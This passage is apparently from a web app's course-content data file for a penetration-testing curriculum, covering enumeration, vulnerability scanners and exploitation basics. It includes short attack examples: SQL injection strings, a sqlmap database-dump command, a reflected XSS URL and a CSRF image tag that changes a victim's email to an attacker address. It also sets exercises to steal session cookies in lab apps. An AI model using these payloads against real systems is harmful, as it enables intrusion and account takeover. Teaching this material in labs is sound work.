                <ul class="list-disc pl-6 mb-6">
                    <li>Book: <em>"Nmap Network Scanning"</em> by Gordon Fyodor Lyon</li>
                    <li>Online Resource: <a href="https://www.vulnhub.com/">VulnHub</a></li>
                    <li>Documentation: <a href="https://nmap.org/book/">Nmap Official Guide</a></li>
                    </ul>
                    
                <p class="font-bold pl-6 mb-6"><em>This chapter introduces two powerful vulnerability scanning tools, Nessus and Qualys, essential for identifying security risks in networks and systems. You'll learn how to set up, configure, and perform scans using these tools, followed by analyzing and documenting your findings.</em></p>
                `},
                {
                title: 'Week:2 Enumeration Techniques',
                content: `
                    <h4 class="font-bold">Introduction to Enumeration</h4>
                    <p class="mb-4">Enumeration is a critical phase in penetration testing and ethical hacking. It follows network scanning and involves probing systems for detailed information, such as usernames, network resources, shared drives, and running services. This phase is essential in building a comprehensive understanding of the target system and identifying weak points for exploitation.</p>
                    <p class="mb-4">In this module, we’ll cover enumerating Windows and Linux systems, extracting information from services like SMB, SNMP, and LDAP, and understanding banner grabbing as a technique for gathering service details.</p>
                    
                    <h4 class="mt-4 font-bold">Key Topics Covered:</h4>
                    <ul class="list-disc pl-6 mb-6">
                        <li><strong>Enumerating Windows and Linux Systems:</strong> Techniques for gathering user accounts and system resources.</li>
                        <li><strong>SMB, SNMP, and LDAP Enumeration:</strong> Extracting information from network services.</li>
                        <li><strong>Shared Resources and Network Services:</strong> Identifying and accessing shared resources.</li>
                        <li><strong>Banner Grabbing:</strong> Gathering service details for vulnerability assessment.</li>
                    </ul>
                    
                    <h4 class="mt-4 font-bold">Practical Activity:</h4>
                    <ul class="pl-6 mb-6">
                        <li><strong>SMB Enumeration:</strong> Use tools like <code>smbclient</code> and <code>enum4linux</code> to extract shared resources and user accounts.</li>
                        <li><strong>SNMP Enumeration:</strong> Utilize <code>snmpwalk</code> to gather SNMP-based information.</li>
                        <li><strong>LDAP Enumeration:</strong> Perform LDAP queries using <code>ldapsearch</code> to extract user and service information.</li>
                    </ul>
                `
            },
                {
                title: ' Enumerating Windows and Linux Systems',
                content: `
                    <h4 class="font-bold">Part 1: Windows Enumeration</h4>
                    <p class="mb-4">Windows enumeration focuses on extracting information from Active Directory (AD), SMB, and other Windows-specific services. Windows systems are often highly integrated with services that allow for sharing resources, managing user accounts, and administrating networks, which makes enumeration highly fruitful in penetration testing.</p>
                    <h4 class="font-bold">Key Techniques for Windows Enumeration:</h4>
                    <ul class="pl-6 mb-6">
                        <li><strong>NetBIOS/SMB Enumeration:</strong> Extract shared resources, user accounts, and more.</li>
                        <li><strong>Active Directory Enumeration:</strong> Extract information about users, groups, computers, and domains in the network.</li>
                        <li><strong>Windows Management Instrumentation (WMI):</strong> Query system information using tools like wmic.</li>
                        <li><strong>PowerShell Enumeration:</strong> Use built-in PowerShell commands to gather detailed system information.</li>
                    </ul>
                    <h4 class="font-bold">Common Tools:</h4>
                    <ul class="pl-6 mb-6">
                        <li><strong>enum4linux:</strong> A tool for gathering information from Windows systems via SMB.</li>
                        <li><strong>wmic:</strong> Query system information on a Windows host.</li>
                    </ul>
                    <h4 class="font-bold">Practical Activity:</h4>
                    <ul class="pl-6 mb-6">
                        <li><strong>SMB Enumeration on a Windows Host:</strong> Use enum4linux or smbclient to enumerate shares, users, and services on a Windows target.</li>
                        <li>Document all discovered shares and accounts, noting any weak passwords or misconfigurations.</li>
                    </ul>
                    <h4 class="font-bold">Linux Enumeration</h4>
                    <p class="mb-4">Linux enumeration focuses on identifying user accounts, services, processes, and misconfigurations. Unlike Windows, Linux systems have a wider variety of open-source services and configurations that might be prone to exploitation.</p>
                    <h4 class="font-bold">Key Techniques for Linux Enumeration:</h4>
                    <ul class="pl-6 mb-6">
                        <li><strong>File and Directory Enumeration:</strong> Identify sensitive files like /etc/passwd and /etc/shadow.</li>
                        <li><strong>Service Enumeration:</strong> Discover running services using netstat or ps commands.</li>
                        <li><strong>NFS Enumeration:</strong> Find and mount shared NFS directories.</li>
                        <li><strong>SSH and Sudo Enumeration:</strong> Check for misconfigurations in SSH access and sudo privileges.</li>
                    </ul>
                    <h4 class="font-bold">Common Tools:</h4>
                    <ul class="pl-6 mb-6">
                        <li><strong>LinEnum:</strong> A bash script for Linux enumeration.</li>
                        <li><strong>netstat:</strong> Identify open network connections and running services.</li>
                    </ul>
                    <h4 class="font-bold">Practical Activity:</h4>
                    <ul class="pl-6 mb-6">
                        <li><strong>Linux User Enumeration:</strong> Access a Linux system and manually enumerate user accounts.</li>
                        <li>Use LinEnum to automate the discovery of accounts and misconfigurations.</li>
                    </ul>`
            },
            {
                title: 'Part 2: SMB, SNMP, and LDAP Enumeration',
                content: `
                    <h4 class="font-bold">SMB Enumeration</h4>
                    <p class="mb-4">SMB is a protocol used by Windows systems for file and resource sharing. Enumerating SMB services allows discovery of shared folders, printers, and user accounts.</p>
                    <h4 class="font-bold">Common Tools:</h4>
                    <ul class="pl-6 mb-6">
                        <li><strong>enum4linux:</strong> Enumerates SMB shares and user accounts.</li>
                        <li><strong>smbclient:</strong> Access shared SMB resources.</li>
                    </ul>
                    <h4 class="font-bold">Practical Activity:</h4>
                    <ul class="pl-6 mb-6">
                        <li>Use smbclient to list shares on a Windows machine.</li>
                        <li>Document any sensitive files found.</li>
                    </ul>
                    <h4 class="font-bold">SNMP Enumeration</h4>
                    <p class="mb-4">SNMP is used for network management. Misconfigured SNMP services can leak critical system and network details.</p>
                    <h4 class="font-bold">Common Tools:</h4>
                    <ul class="pl-6 mb-6">
                        <li><strong>snmpwalk:</strong> Query SNMP-enabled devices.</li>
                        <li><strong>onesixtyone:</strong> Brute-force SNMP community strings.</li>
                    </ul>
                    <h4 class="font-bold">Practical Activity:</h4>
                    <ul class="pl-6 mb-6">
                        <li>Use snmpwalk to enumerate system information from a device.</li>
                        <li>Document device details and configurations.</li>
                    </ul>
                    <h4 class="font-bold">LDAP Enumeration</h4>
                    <p class="mb-4">LDAP is used in AD environments to manage user credentials and resources.</p>
                    <h4 class="font-bold">Common Tools:</h4>
                    <ul class="pl-6 mb-6">
                        <li><strong>ldapsearch:</strong> Query LDAP servers.</li>
                        <li><strong>Nmap:</strong> Use NSE scripts for LDAP extraction.</li>
                    </ul>
                    <h4 class="font-bold">Practical Activity:</h4>
                    <ul class="pl-6 mb-6">
                        <li>Use ldapsearch to enumerate user accounts and groups.</li>
                        <li>Analyze the extracted data for potential attack vectors.</li>
                    </ul>`
            },
            {
                title: 'Part 3: Extracting User Accounts, Shared Resources, and Network Services',
                content: `
                        <h4 class="font-bold">Extracting User Accounts, Shared Resources, and Network Services</h4>
                        <p class="mb-4">The main goal of enumeration is to extract useful data from target systems that can be leveraged in later phases of penetration testing.</p>
                        <h4 class="font-bold">Key Information to Extract</h4>
                        <ul class="pl-6 mb-6">
                            <li><strong>User Accounts:</strong> Identify usernames for brute force or password attacks.</li>
                            <li><strong>Shared Resources:</strong> Uncover file shares that might contain sensitive information.</li>
                            <li><strong>Network Services:</strong> Discover exploitable services like FTP, Telnet, SMB, and NFS.</li>
                        </ul>
                        <h4 class="font-bold">Common Tools</h4>
                        <ul class="pl-6 mb-6">
                            <li><strong>enum4linux:</strong> Windows user and share enumeration.</li>
                            <li><strong>rpcclient:</strong> Query Windows RPC services for usernames.</li>
                            <li><strong>NFS Enumeration:</strong> Use showmount to list NFS shares.</li>
                        </ul>
                        <h4 class="font-bold">Practical Activity</h4>
                        <ul class="pl-6 mb-8">
                            <li><strong>User Account Enumeration:</strong> Use rpcclient or enum4linux to extract user account details.</li>
                            <li><strong>Document Findings:</strong> Note usernames, shares, and misconfigurations.</li>
                            </ul>
                    <h4 class="font-bold text-2xl mb-4">Banner Grabbing and Its Role in Enumeration</h4>
                    <h4 class="font-bold">Banner Grabbing</h4>
                    <p class="mb-4">Banner grabbing is a technique to gather information about services running on open ports.</p>
                    <h4 class="font-bold">Common Tools:</h4>
                    <ul class="pl-6 mb-6">
                        <li><strong>Netcat:</strong> Connect and capture service banners.</li>
                        <li><strong>Nmap:</strong> Use version detection for banners.</li>
                    </ul>
                    <h4 class="font-bold">Practical Activity:</h4>
                    <ul class="pl-6 mb-6">
                        <li>Use Netcat to grab HTTP service banners.</li>
                        <li>Document and analyze the banner for vulnerabilities.</li>
                    </ul>`
            },
            {
                title:"Assignment for Week 2",
                content: `
                
                <ul class="pl-6 mb-6">
                    <li><strong>Lab Report:</strong> Perform enumeration on a target system using tools like enum4linux, snmpwalk, and ldapsearch. Document results and attack vectors.</li>
                    <li><strong>Banner Grabbing Exercise:</strong> Use Netcat and Nmap to gather version information and identify vulnerabilities.</li>
                </ul>
                <h4 class="font-bold">Additional Reading</h4>
                <ul class="pl-6 mb-6">
                    <li><strong>Book:</strong> Hacking Exposed 7 by Stuart McClure.</li>
                    <li><strong>Tool Guide:</strong> <a href="https://labs.portcullis.co.uk/tools/enum4linux/">enum4linux Documentation</a></li>
                    <li><strong>Nmap NSE Scripts:</strong> <a href="https://nmap.org/nsedoc/">Nmap NSE Scripts</a></li>
                </ul>
                <h4 class="font-bold">Next Week Preview</h4>
                <p>Next week, we will cover Vulnerability Analysis using tools like Burp Suite, OWASP ZAP, and Nikto.</p>`
            }
                ],
                videoUrl: 'https://www.youtube.com/embed/NetworkScanningBasics',
                commands: { whoami, echo, help },
                content: ''
                },
        ]
    },
    {   
    id: "network-security",
    title: "Network Security",
    chapters: [   
                {
                id: "module-4",
                title: 'Module 4: Vulnerability Analysis',
                icon: Search,
                sections: [
                            {
                title: 'Week 1: Understanding Vulnerabilities',
                content: `
                    <h4 class="font-bold">Part: 1 Introduction to Vulnerability Analysis</h4>
                    <p class="mb-4">Vulnerability analysis involves identifying, analyzing, and classifying security weaknesses in systems, software, and networks. This process is essential for understanding potential threats and implementing effective countermeasures to secure systems.</p>
                    <p class="mb-4">In this module, we will explore different types of vulnerabilities, vulnerability databases, manual versus automated analysis approaches, and commonly used tools for vulnerability scanning.</p>
                    
                    <h4 class="mt-4 font-bold">Key Topics Covered:</h4>
                    <ul class="list-disc pl-6 mb-6">
                        <li><strong>Types of Vulnerabilities:</strong> Software, hardware, network, and human vulnerabilities.</li>
                        <li><strong>Vulnerability Databases:</strong> CVE, NVD, and Exploit-DB.</li>
                        <li><strong>Manual vs. Automated Vulnerability Analysis:</strong> Differences, advantages, and limitations.</li>
                        <li><strong>Vulnerability Scanning Tools:</strong> Burp Suite, OWASP ZAP, and Nikto.</li>
                    </ul>
                    
                    <h4 class="mt-4 font-bold">Types of Vulnerabilities</h4>
                    <p class="mb-4">Understanding the various types of vulnerabilities helps in identifying weak points that attackers can exploit. Below are key categories:</p>
                    
                    <h5 class="font-bold">1. Software Vulnerabilities</h5>
                    <p class="mb-2">Arise from flaws in the code, configuration errors, or misuse of system functions.</p>
                    <ul class="pl-6 mb-4">
                        <li><strong>SQL Injection (SQLi):</strong> Attackers manipulate databases using malicious SQL queries.</li>
                        <li><strong>Buffer Overflow:</strong> Excessive data overwrites memory buffers, causing crashes or unauthorized code execution.</li>
                        <li><strong>Example Vulnerability:</strong> <em>CVE-2017-5638:</em> A Struts2 vulnerability allowing remote code execution.</li>
                    </ul>
                    
                    <h5 class="font-bold">2. Hardware Vulnerabilities</h5>
                    <p class="mb-2">These are design flaws or physical issues in hardware components.</p>
                    <ul class="pl-6 mb-4">
                        <li><strong>Spectre/Meltdown:</strong> CPU vulnerabilities leaking sensitive data between processes.</li>
                        <li><strong>Rowhammer:</strong> Exploits memory cell interactions to leak data.</li>
                    </ul>
                    
                    <h5 class="font-bold">3. Network Vulnerabilities</h5>
                    <p class="mb-2">Weaknesses in network services, protocols, or misconfigurations.</p>
                    <ul class="pl-6 mb-4">
                        <li><strong>Man-in-the-Middle (MITM) Attack:</strong> Interception and alteration of network communication.</li>
                        <li><strong>Unencrypted Protocols:</strong> FTP and Telnet expose data in plaintext, making them susceptible to eavesdropping.</li>
                    </ul>
                    
                    
                `
            },
            {
                title: 'Part:2 Human Vulnerabilities & Vulnerability Databases',
                content: `
                    <h4 class="font-bold">Understanding Human Vulnerabilities</h4>
                    <p class="mb-4">Human vulnerabilities refer to the weaknesses introduced by users or administrators due to lack of awareness or poor security practices. Examples include phishing attacks and weak passwords. </p>
                    
                    <h5 class="font-bold">Common Examples:</h5>
                    <ul class="list-disc pl-6 mb-4">
                        <li><strong>Phishing:</strong> Tricking users into revealing sensitive information by pretending to be a trustworthy entity.</li>
                        <li><strong>Weak Passwords:</strong> Easily guessed or reused passwords across accounts, enabling unauthorized access.</li>
                    </ul>
        
                    <h5 class="font-bold">Practical Activity:</h5>
                    <ol class="list-decimal pl-6 mb-6">
                        <li><strong>Research Vulnerabilities:</strong> Identify and document three real-world vulnerabilities from the CVE database (one each from software, hardware, and network vulnerabilities).</li>
                        <li><strong>Impact Analysis:</strong> Analyze the impact of these vulnerabilities and the steps taken to mitigate them.</li>
                    </ol>
        
                    <h4 class="font-bold">Vulnerability Databases</h4>
                    <p class="mb-4">Understanding how to find and utilize vulnerability databases is a key skill in vulnerability analysis. These databases provide details about known vulnerabilities and their exploits, helping security professionals stay informed about potential threats. </p>
        
                    <h5 class="font-bold">1. CVE (Common Vulnerabilities and Exposures)</h5>
                    <p class="mb-2">A public list of cybersecurity vulnerabilities maintained by the MITRE Corporation. Each vulnerability is assigned a unique CVE ID.</p>
                    <p><strong>Example Vulnerability:</strong> <em>CVE-2020-0601:</em> A Windows CryptoAPI vulnerability enabling attackers to spoof digital certificates.</p>
        
                    <h5 class="font-bold">2. NVD (National Vulnerability Database)</h5>
                    <p class="mb-2">NVD is built upon CVE entries and provides detailed information about vulnerability impact, scoring, and mitigation strategies.</p>
                    <ul class="pl-6 mb-4">
                        <li><strong>Impact Metrics:</strong> Assesses effects on confidentiality, integrity, and availability.</li>
                        <li><strong>Severity Scores:</strong> Uses CVSS (Common Vulnerability Scoring System) to rank vulnerabilities as low, medium, or critical.</li>
                        <li><strong>Mitigation Information:</strong> Provides actionable remediation steps.</li>
                    </ul>
        
                    <h5 class="font-bold">3. Exploit-DB</h5>
                    <p class="mb-2">Exploit-DB is a public archive of exploits, covering vulnerabilities found in software, operating systems, and services. It provides proof-of-concept (PoC) code and details on how vulnerabilities can be exploited. </p>
                    <h4 class="font-bold">Exploit-DB Features: </h4>
                    <ul class="pl-6 mb-4">
                        <li><strong>PoC Code:</strong> Example exploit scripts demonstrating vulnerability use cases.</li>
                        <li><strong>Searchable Database:</strong> Easily search vulnerabilities by software, OS, or exploit type.</li>
                        <li><strong>Historical Vulnerabilities:</strong> Archive of past vulnerabilities and exploits.</li>
                    </ul>
                    <p><strong>Example Search:</strong> Searching for vulnerabilities in Apache might return exploits for known issues like <em>CVE-2017-5638</em>.</p>
        
                    <h5 class="font-bold">Practical Activity:</h5>
                    <ol class="list-decimal pl-6 mb-6">
                        <li><strong>Search Exploit-DB:</strong> Use Exploit-DB to search for an exploit related to software like WordPress or Apache.</li>
                        <li><strong>Analyze the Exploit:</strong> Document how the vulnerability is leveraged and the potential impact on affected systems.</li>
                    </ol>
                `},
                {
                    title: 'Part:3 Manual vs. Automated Vulnerability Analysis',
                    content: `
                        <h4 class="font-bold">Manual vs. Automated Vulnerability Analysis</h4>
                        <p class="mb-4">Manual and automated vulnerability analysis approaches are both important in penetration testing and vulnerability management.</p>
                        
                        <h5 class="font-bold">Manual Vulnerability Analysis</h5>
                        <p class="mb-2">Manual vulnerability analysis involves a deep, human-driven approach to finding and analyzing vulnerabilities. This method allows security professionals to:</p>
                        <ul class="list-disc pl-6 mb-4">
                            <li>Identify logic flaws and business logic vulnerabilities that are often missed by automated tools.</li>
                            <li>Understand complex attack scenarios that automated tools may not recognize.</li>
                            <li>Exploit vulnerabilities in custom web applications or APIs.</li>
                        </ul>
            
                        <h6 class="font-bold">Common Manual Techniques:</h6>
                        <ul class="list-disc pl-6 mb-4">
                            <li><strong>Code Reviews:</strong> Inspecting source code to identify insecure functions or logic flaws.</li>
                            <li><strong>Manual Testing with Burp Suite:</strong> Actively interacting with a web application, modifying requests, and testing for vulnerabilities such as SQL injection, XSS, or CSRF.</li>
                            <li><strong>Social Engineering:</strong> Manually probing for human vulnerabilities through phishing, impersonation, or tailgating.</li>
                        </ul>
            
                        <h5 class="font-bold">Automated Vulnerability Analysis</h5>
                        <p class="mb-2">Automated vulnerability analysis uses tools to scan and identify vulnerabilities across a wide range of systems. These tools can cover large networks quickly and can find well-known vulnerabilities based on signatures or behavioral patterns.</p>
            
                        <h6 class="font-bold">Advantages of Automated Analysis:</h6>
                        <ul class="list-disc pl-6 mb-4">
                            <li><strong>Speed:</strong> Automated tools can scan large networks in a fraction of the time it takes to perform a manual analysis.</li>
                            <li><strong>Efficiency:</strong> These tools can detect common vulnerabilities in software, systems, and network configurations.</li>
                            <li><strong>Coverage:</strong> Automated tools can check for a wide range of vulnerabilities, ensuring nothing is overlooked.</li>
                        </ul>
            
                        <h6 class="font-bold">Limitations:</h6>
                        <ul class="list-disc pl-6 mb-4">
                            <li><strong>False Positives/Negatives:</strong> Automated tools may miss complex vulnerabilities or flag harmless configurations as issues.</li>
                            <li><strong>Customization:</strong> Automated tools may not perform well in custom-built systems or complex environments that require tailored testing.</li>
                        </ul>
            
                        <h5 class="font-bold">Practical Activity:</h5>
                        <ol class="list-decimal pl-6 mb-6">
                            <li><strong>Compare Manual and Automated Techniques:</strong></li>
                            <ol class="list-disc pl-6">
                                <li>Use Burp Suite for manual web vulnerability testing on a target application.</li>
                                <li>Use OWASP ZAP for automated scanning on the same application.</li>
                                <li>Document the findings from each method and compare the results.</li>
                            </ol>
                        </ol>
                    `},
                    {
                title: 'Part: 4 Vulnerability Scanning Tools',
                content: `
                    <h4 class="font-bold">Vulnerability Scanning Tools: Burp Suite, OWASP ZAP, Nikto</h4>
                    <p class="mb-4">Vulnerability scanning tools help automate the discovery of security issues in web applications, services, and networks. Below are three of the most commonly used tools.</p>
                    
                    <h5 class="font-bold">1. Burp Suite</h5>
                    <p class="mb-2">Burp Suite is a popular tool for web application vulnerability scanning and penetration testing. It includes manual and automated tools to test for various web vulnerabilities such as SQL injection, XSS, CSRF, and more.</p>
                    <h6 class="font-bold">Key Features:</h6>
                    <ul class="list-disc pl-6 mb-4">
                        <li><strong>Proxy:</strong> Captures and modifies HTTP/S requests and responses.</li>
                        <li><strong>Scanner:</strong> Automatically scans web applications for vulnerabilities.</li>
                        <li><strong>Repeater:</strong> Allows testers to manually modify and resend requests to test for flaws.</li>
                    </ul>
                    
                    <h6 class="font-bold">Practical Activity:</h6>
                    <ol class="list-decimal pl-6 mb-6">
                        <li>Launch Burp Suite and configure the proxy settings to intercept a web application’s traffic.</li>
                        <li>Use the Scanner feature to find vulnerabilities such as XSS or SQL injection.</li>
                        <li>Document the findings and analyze the risks associated with the vulnerabilities.</li>
                    </ol>
                    
                    <h5 class="font-bold">2. OWASP ZAP (Zed Attack Proxy)</h5>
                    <p class="mb-2">OWASP ZAP is an open-source web application vulnerability scanner that provides both passive and active scanning features. It is widely used for automated security testing and is designed to be beginner-friendly.</p>
                    <h6 class="font-bold">Key Features:</h6>
                    <ul class="list-disc pl-6 mb-4">
                        <li><strong>Passive Scanning:</strong> Monitors requests and responses to identify security issues.</li>
                        <li><strong>Active Scanning:</strong> Sends attack payloads to test for vulnerabilities like SQL injection, XSS, and more.</li>
                        <li><strong>Spider:</strong> Crawls the entire website to map the attack surface.</li>
                    </ul>
                    
                    <h6 class="font-bold">Practical Activity:</h6>
                    <ol class="list-decimal pl-6 mb-6">
                        <li>Set up OWASP ZAP to passively scan a target web application.</li>
                        <li>Run an active scan to test for SQL injection and XSS vulnerabilities.</li>
                        <li>Review the findings and create a remediation plan for fixing the vulnerabilities.</li>
                    </ol>
                                                    
                `},
                {
                title: 'Part:5 Vulnerability Analysis - Assignment and Further Learning',
                content: `
                    <h5 class="font-bold">3. Nikto</h5>
                <p class="mb-2">Nikto is an open-source web server scanner that detects potential vulnerabilities in web servers and web applications. It checks for outdated versions, misconfigurations, dangerous files, and more.</p>
                <h6 class="font-bold">Key Features:</h6>
                <ul class="list-disc pl-6 mb-4">
                    <li><strong>Scans for over 6,700 potentially dangerous files/programs.</strong></li>
                    <li><strong>Checks for server misconfigurations like default credentials.</strong></li>
                    <li><strong>Identifies outdated versions of servers and web applications.</strong></li>
                </ul>
                
                <h6 class="font-bold">Practical Activity:</h6>
                <ol class="list-decimal pl-6 mb-6">
                    <li>Use Nikto to scan a target web server and identify any outdated software or dangerous files.</li>
                    <li>Document the identified issues and research how to mitigate them.</li>
                </ol>
                
                <pre class="bg-gray-900 text-green-400 p-4 rounded-md"><code>nikto -h http://192.168.1.100</code></pre>
                    <h4 class="font-bold">Assignment for Week 7:</h4>
                    <ul class="list-disc pl-6 mb-4">
                        <li><strong>Lab Report:</strong> Perform a vulnerability analysis on a target web application using Burp Suite and OWASP ZAP. Compare the vulnerabilities discovered by each tool and provide a remediation plan for the issues identified.</li>
                        <li><strong>Exploit Research:</strong> Search Exploit-DB for vulnerabilities related to a popular web server (e.g., Apache, IIS). Write a report on how these vulnerabilities can be exploited, using specific CVE IDs.</li>
                    </ul>
                    
                    <h4 class="font-bold">Additional Reading:</h4>
                    <ul class="list-disc pl-6 mb-4">
                        <li><strong>Book:</strong> "The Web Application Hacker’s Handbook" by Dafydd Stuttard and Marcus Pinto — A detailed guide to web application vulnerability testing using tools like Burp Suite.</li>
                        <li><strong>CVE Database:</strong> <a href="https://cve.mitre.org/" class="text-blue-500 underline">https://cve.mitre.org/</a> — Explore the latest vulnerabilities in widely used software and hardware.</li>
                        <li><strong>OWASP ZAP Guide:</strong> <a href="https://owasp.org/www-project-zap/" class="text-blue-500 underline">https://owasp.org/www-project-zap/</a> — Learn how to use OWASP ZAP effectively for web application scanning.</li>
                    </ul>
                    
                    <h4 class="font-bold">Next Week Preview:</h4>
                    <p class="mb-4">Next week, we will explore <strong>Exploitation Basics</strong>, focusing on how to exploit common vulnerabilities like SQL Injection, Cross-Site Scripting (XSS), and SMB vulnerabilities.</p>
                    <p>We’ll also introduce <strong>Metasploit</strong> for automated exploitation.</p>
                `},
                {
                title: 'Week 2: Exploitation Basics',
                content: `
                    <h4 class="font-bold">Part:1 Exploitation Basics</h4>
                    <p>In this week’s module, we dive into the basics of Exploitation, where vulnerabilities identified during earlier phases are leveraged to gain unauthorized access to systems, applications, and data. Exploitation involves using specific techniques to compromise a target by exploiting weaknesses in code, network configurations, or misconfigured services. We will cover various exploitation techniques for web applications, network vulnerabilities, and introduce exploitation frameworks such as Metasploit.</p>
                    
                    <h4 class="font-bold">Topics Covered:</h4>
                    <ul class="list-disc pl-6 mb-4">
                        <li>Introduction to Exploitation: Concepts and techniques.</li>
                        <li>Exploiting Web Application Vulnerabilities: SQL Injection, XSS, CSRF.</li>
                        <li>Exploiting Network Vulnerabilities: SMB Relay, Man-in-the-Middle Attacks.</li>
                        <li>Introduction to Exploitation Frameworks: Metasploit.</li>
                    </ul>
                    
                    <h4 class="font-bold">Introduction to Exploitation: Concepts and Techniques</h4>
                    <p>Exploitation is the process of taking advantage of vulnerabilities to compromise the security of a target system or application. Once a vulnerability is identified, the goal is to execute arbitrary code, elevate privileges, extract sensitive information, or pivot to other systems in the network.</p>
                    
                    <h4 class="font-bold">Key Concepts in Exploitation:</h4>
                    <ul class="list-disc pl-6 mb-4">
                        <li><strong>Vulnerability:</strong> A weakness in software, hardware, or configuration that can be exploited.</li>
                        <li><strong>Exploit:</strong> Code or techniques used to trigger a vulnerability and achieve exploitation.</li>
                        <li><strong>Payload:</strong> The actual code that runs on the target after the exploit is executed, such as reverse shells or code execution payloads.</li>
                        <li><strong>Post-Exploitation:</strong> Actions performed after a successful exploit, such as privilege escalation or data exfiltration.</li>
                    </ul>
        
                    <h4 class="font-bold">Common Exploitation Techniques:</h4>
                    <ul class="list-disc pl-6 mb-4">
                        <li><strong>Code Injection:</strong> Injecting malicious code into a vulnerable input field to be executed by the system (e.g., SQL injection).</li>
                        <li><strong>Buffer Overflow:</strong> Sending more data to a buffer than it can hold, leading to memory corruption and execution of arbitrary code.</li>
                        <li><strong>Session Hijacking:</strong> Taking over a session by stealing session tokens, cookies, or credentials.</li>
                    </ul>
        
                    <h4 class="font-bold">Practical Activity:</h4>
                    <ul class="list-disc pl-6 mb-4">
                        <li><strong>Exploit a Simple Vulnerability:</strong></li>
                        <ul class="list-inside pl-6">
                            <li>Set up a vulnerable web application (such as DVWA or bWAPP) in a virtual environment.</li>
                            <li>Identify and exploit an SQL injection vulnerability using manual techniques or tools like sqlmap.</li>
                            <li>Document how the attack was performed and the data retrieved.</li>
                        </ul>
                    </ul>
                `},
                {
                title: 'Part:2 Exploiting Web Application Vulnerabilities: SQL Injection, XSS, CSRF',
                content: `
                    <h4 class="font-bold">1. SQL Injection (SQLi)</h4>
                    <p>SQL Injection (SQLi) is one of the most common and dangerous vulnerabilities in web applications. It occurs when an attacker is able to insert or manipulate SQL queries via user input fields, allowing them to interact with the database directly.</p>
                    <h4 class="font-bold">Example of SQL Injection:</h4>
                    <p class="mb-4">
                        <pre class="mb-4">SELECT * FROM users WHERE username = 'admin' --' AND password = 'password';</pre>

                    </p>
                    <p>In this query, the attacker adds a comment (--) to bypass the password check.</p>
        
                    <h4 class="font-bold">Manual Exploitation:</h4>
                    <ul class="list-disc pl-6 mb-4">
                        <li>Identify input fields that are not properly sanitized.</li>
                        <li>Test with special characters like ' or " to check for SQL injection vulnerability.</li>
                        <li>Extract data by injecting SQL commands, such as:</li>
                        <pre>' OR '1'='1'; --</pre>
                    </ul>
        
                    <h4 class="font-bold">Tools:</h4>
                    <ul class="list-disc pl-6 mb-4">
                        <li><strong>sqlmap:</strong> An automated SQL injection tool that can test and exploit SQL vulnerabilities.</li>
                    </ul>
                    <h4 class="font-bold">Example Command:</h4>
                    <pre>sqlmap -u "http://example.com/index.php?id=1" --dump
                    </pre>
        
                    <h4 class="font-bold">Practical Activity:</h4>
                    <ul class="list-disc pl-6 mb-4">
                        <li>Set up a vulnerable web application (like DVWA or bWAPP).</li>
                        <li>Use sqlmap to identify and exploit an SQL injection vulnerability.</li>
                        <li>Extract data from the backend database, such as usernames and passwords.</li>
                    </ul>
        
                    <h4 class="font-bold">2. Cross-Site Scripting (XSS)</h4>
                    <p>XSS is a vulnerability that allows an attacker to inject malicious scripts into web pages that are viewed by other users. These scripts can steal session cookies, redirect users, or perform actions on behalf of the victim.</p>
        
                    <h4 class="font-bold">Types of XSS:</h4>
                    <ul class="list-disc pl-6 mb-4">
                        <li><strong>Stored XSS:</strong> The malicious script is stored on the server and executed every time a user visits the affected page.</li>
                        <li><strong>Reflected XSS:</strong> The script is reflected off a web server, such as in search results or error messages.</li>
                        <li><strong>DOM-based XSS:</strong> Occurs when the vulnerability is in the client-side code, where user input is directly manipulated in the browser.</li>
                    </ul>
        
                    <h4 class="font-bold">Example of a Reflected XSS Attack:</h4>
                    <pre>http://example.com/search?q=<script>alert('XSS')</script>
                    </pre>`},
                {
                    title: 'cont. Cross-Site Request Forgery (CSRF)',
                    content: `
                        <h4 class="font-bold">Tools:</h4>
                    <ul class="list-disc pl-6 mb-4">
                        <li><strong>Burp Suite:</strong> Manual testing of XSS vulnerabilities by injecting payloads into input fields or URLs.</li>
                        <li><strong>XSS Hunter:</strong> A tool that helps identify and exploit XSS vulnerabilities.</li>
                    </ul>
        
                    <h4 class="font-bold">Practical Activity:</h4>
                    <ul class="list-disc pl-6 mb-4">
                        <li>Use Burp Suite or your browser’s developer tools to inject JavaScript payloads into input fields.</li>
                        <li>Identify whether the input is reflected or stored.</li>
                        <li>Trigger an alert or steal a session cookie to demonstrate the vulnerability.</li>
                    </ul>
                        <h4 class="font-bold"> 3. Cross-Site Request Forgery (CSRF)</h4>
                        <p>CSRF is a type of attack where an attacker tricks a user into executing unwanted actions on a web application in which they are authenticated. The attack leverages the victim's credentials to perform actions like changing a password or making a transaction.</p>
            
                        <h4 class="font-bold">How CSRF Works:</h4>
                        <ul class="list-decimal pl-6 mb-4">
                            <li>The attacker sends a malicious link to the victim (e.g., via email).</li>
                            <li>The victim clicks the link while logged into the target site.</li>
                            <li>The site executes the attacker’s request using the victim's authenticated session.</li>
                        </ul>
            
                        <h4 class="font-bold">Example:</h4>
                        <pre>&lt;img src="http://example.com/changeemail?email=attacker@malicious.com"&gt;
                        </pre>
            
                        <h4 class="font-bold">Tools:</h4>
                        <ul class="list-disc pl-6 mb-4">
                            <li><strong>CSRF PoC Generators:</strong> Burp Suite has a built-in CSRF PoC generator that automates creating proof-of-concept attacks.</li>
                        </ul>
            
                        <h4 class="font-bold">Practical Activity:</h4>
                        <ul class="list-disc pl-6 mb-4">
                            <li>Use Burp Suite to generate a CSRF attack for a vulnerable form (such as a password change or settings update).</li>
                            <li>Test the attack to confirm the victim’s account settings can be changed without their knowledge.</li>
                        </ul>
                    `},
                    {
                        title: 'Part: 3 Exploiting Network Vulnerabilities: SMB Relay, Man-in-the-Middle Attacks',
                        content: `
                            <h4 class="font-bold">1. SMB Relay Attacks</h4>
                            <p>SMB Relay is a type of Man-in-the-Middle (MITM) attack where an attacker intercepts SMB traffic and relays it to another system, tricking it into authenticating the attacker. It exploits the weakness in SMB protocol authentication, where credentials are relayed without being properly verified.</p>
                
                            <h4 class="font-bold">Steps in an SMB Relay Attack:</h4>
                            <ul class="list-decimal pl-6 mb-4">
                                <li>The attacker listens for SMB authentication requests from a victim.</li>
                                <li>The attacker intercepts and relays these requests to another system.</li>
                                <li>The second system authenticates the attacker, giving them unauthorized access.</li>
                            </ul>
                
                            <h4 class="font-bold">Tools:</h4>
                            <ul class="list-disc pl-6 mb-4">
                                <li><strong>Responder:</strong> A tool that captures NTLMv2 authentication requests and performs SMB Relay attacks.</li>
                            </ul>
                            <pre>
